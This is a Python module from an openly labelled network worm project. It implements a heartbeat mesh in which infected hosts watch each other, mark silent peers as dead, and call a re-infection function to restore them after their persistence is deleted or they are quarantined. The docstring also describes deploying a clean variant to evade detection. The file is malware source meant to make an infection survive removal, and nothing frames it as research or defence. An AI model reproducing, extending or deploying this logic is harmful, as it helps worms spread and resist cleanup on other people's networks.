"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Distributed Redundancy System
Peer-to-peer healing where infected hosts monitor and repair each other.

Instead of local self-healing, hosts form a mesh network:
- Host A and Host B monitor each other via heartbeat
- If Host B's persistence is deleted, Host A re-infects it
- If Host B is detected/quarantined, Host A deploys a clean variant
- The mesh is self-organizing and fault-tolerant
"""

import hashlib
import json
import os
import socket
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class HeartbeatProtocol:
    """
    Heartbeat protocol for peer-to-peer health monitoring

    Each infected host sends periodic heartbeats to its peers.
    Missing heartbeats trigger automatic repair.
    """

    HEARTBEAT_INTERVAL = 60  # seconds
    HEARTBEAT_TIMEOUT = 180  # seconds before declaring peer dead
    MAX_PEERS = 10

    def __init__(self, host_ip: str, host_id: str = ""):
        self.host_ip = host_ip
        self.host_id = host_id or hashlib.md5(host_ip.encode()).hexdigest()[:8]
        self.peers: Dict[str, Dict] = {}  # peer_id → {ip, last_heartbeat, health, status}
        self.my_health = 100.0
        self.my_status = "active"
        self.heartbeat_log: List[Dict] = []

    def add_peer(self, peer_ip: str, peer_id: str = ""):
        """Add a peer to the monitoring mesh"""
        pid = peer_id or hashlib.md5(peer_ip.encode()).hexdigest()[:8]
        if pid not in self.peers and len(self.peers) < self.MAX_PEERS:
            self.peers[pid] = {
                "ip": peer_ip,
                "id": pid,
                "last_heartbeat": time.time(),
                "health": 100.0,
                "status": "active",
                "missed_heartbeats": 0,
            }
            logger.debug(f"Peer added: {peer_ip} ({pid})")

    def send_heartbeat(self) -> Dict:
        """Generate a heartbeat message"""
        self.my_health = max(0, min(100, self.my_health))
        return {
            "type": "heartbeat",
            "host_id": self.host_id,
            "host_ip": self.host_ip,
            "health": self.my_health,
            "status": self.my_status,
            "timestamp": time.time(),
            "peer_count": len(self.peers),
        }

    def receive_heartbeat(self, heartbeat: Dict):
        """Process a heartbeat from a peer"""
        peer_id = heartbeat.get("host_id", "")
        if peer_id in self.peers:
            peer = self.peers[peer_id]
            peer["last_heartbeat"] = time.time()
            peer["health"] = heartbeat.get("health", 100.0)
            peer["status"] = heartbeat.get("status", "active")
            peer["missed_heartbeats"] = 0

    def check_peer_health(self) -> List[str]:
        """Check for dead or unhealthy peers"""
        unhealthy = []
        now = time.time()

        for peer_id, peer in self.peers.items():
            time_since_hb = now - peer["last_heartbeat"]

            if time_since_hb > self.HEARTBEAT_TIMEOUT:
                peer["missed_heartbeats"] += 1
                if peer["status"] != "dead":
                    peer["status"] = "dead"
                    unhealthy.append(peer_id)
                    logger.warning(
                        f"Peer DEAD: {peer['ip']} ({peer_id}) - no heartbeat for {time_since_hb:.0f}s"
                    )
            elif peer["health"] < 30:
                if peer["status"] != "critical":
                    peer["status"] = "critical"
                    unhealthy.append(peer_id)
                    logger.warning(
                        f"Peer CRITICAL: {peer['ip']} ({peer_id}) - health: {peer['health']:.0f}"
                    )

        return unhealthy

    def get_dead_peers(self) -> List[Dict]:
        """Get list of dead peers that need re-infection"""
        return [peer for peer in self.peers.values() if peer["status"] == "dead"]

    def get_statistics(self) -> Dict:
        """Get mesh statistics"""
        active = sum(1 for p in self.peers.values() if p["status"] == "active")
        critical = sum(1 for p in self.peers.values() if p["status"] == "critical")
        dead = sum(1 for p in self.peers.values() if p["status"] == "dead")

        return {
            "host_id": self.host_id,
            "host_ip": self.host_ip,
            "my_health": self.my_health,
            "my_status": self.my_status,
            "total_peers": len(self.peers),
            "active_peers": active,
            "critical_peers": critical,
            "dead_peers": dead,
        }


class DistributedRedundancy:
    """
    Distributed redundancy system for collective self-healing

    Features:
    - Peer-to-peer heartbeat monitoring
    - Automatic re-infection of dead peers
    - Payload redistribution when variants are detected
    - Mesh network self-organization
    """

    def __init__(self, host_ip: str, host_id: str = ""):
        self.heartbeat = HeartbeatProtocol(host_ip, host_id)
        self.repair_log: List[Dict] = []
        self.repair_count = 0
        self.reinfection_attempts: Dict[str, int] = {}

    def add_peer(self, peer_ip: str, peer_id: str = ""):
        """Add a peer to the redundancy mesh"""
        self.heartbeat.add_peer(peer_ip, peer_id)

    def check_and_repair(self, reinfect_func=None) -> List[Dict]:
        """
        Check peer health and repair dead peers

        Args:
            reinfect_func: Function to call for re-infection
                          Signature: (peer_ip, peer_id) -> bool

        Returns:
            List of repair actions taken
        """
        repairs = []
        dead_peers = self.heartbeat.get_dead_peers()

        for peer in dead_peers:
            peer_ip = peer["ip"]
            peer_id = peer["id"]

            # Limit re-infection attempts
            attempts = self.reinfection_attempts.get(peer_ip, 0)
            if attempts >= 3:
                logger.warning(f"Max re-infection attempts for {peer_ip}, skipping")
                continue

            logger.info(f"Attempting to repair dead peer: {peer_ip} ({peer_id})")

            if reinfect_func:
                success = reinfect_func(peer_ip, peer_id)
                if success:
                    self.repair_count += 1
                    self.reinfection_attempts[peer_ip] = 0
                    self.heartbeat.peers[peer_id]["status"] = "active"
                    self.heartbeat.peers[peer_id]["health"] = 100.0
                    repairs.append(
                        {
                            "action": "reinfection",
                            "peer_ip": peer_ip,
                            "peer_id": peer_id,
                            "success": True,
                            "timestamp": datetime.now().isoformat(),
                        }
                    )
                    logger.success(f"Peer repaired: {peer_ip}")
                else:
                    self.reinfection_attempts[peer_ip] = attempts + 1
                    repairs.append(
                        {
                            "action": "reinfection_failed",
                            "peer_ip": peer_ip,
                            "peer_id": peer_id,
                            "attempt": attempts + 1,
                            "timestamp": datetime.now().isoformat(),
                        }
                    )

        self.repair_log.extend(repairs)
        return repairs

    def update_health(self, health: float, status: str = "active"):
        """Update own health status"""
        self.heartbeat.my_health = health
        self.heartbeat.my_status = status

    def get_mesh_status(self) -> Dict:
        """Get complete mesh status"""
        return {
            "heartbeat": self.heartbeat.get_statistics(),
            "total_repairs": self.repair_count,
            "repair_log_size": len(self.repair_log),
            "reinfection_attempts": self.reinfection_attempts,
        }
